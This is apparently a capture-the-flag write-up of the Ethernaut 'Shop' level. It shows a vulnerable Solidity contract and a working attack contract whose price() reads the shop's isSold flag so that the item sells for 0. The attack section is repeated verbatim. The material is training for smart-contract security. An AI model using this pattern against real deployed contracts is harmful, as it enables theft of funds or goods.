<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel20.svg">

# Target Contract Review

Given contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

Challenge's message:

> Сan you get the item from the shop for less than the price asked?

# Subverting


```solidity
pragma solidity ^0.8.0;

import './Shop.sol';


contract Attack is Buyer{

    Shop target;

    constructor(address _target){
        target = Shop(_target);
    }

    function buy()external{
        target.buy();
    }

    function price() external override view returns (uint){
        return target.isSold() ? 0:100;
    }

}
```

Ethernaut's message:

> Contracts can manipulate data seen by other contracts in any way they want. It's unsafe to change the state based on external and untrusted contracts logic.

# Subverting

```solidity
pragma solidity ^0.8.0;

import './Shop.sol';


contract Attack is Buyer{

    Shop target;

    constructor(address _target){
        target = Shop(_target);
    }

    function buy()external{
        target.buy();
    }

    function price() external override view returns (uint){
        return target.isSold() ? 0:100;
    }

}
```


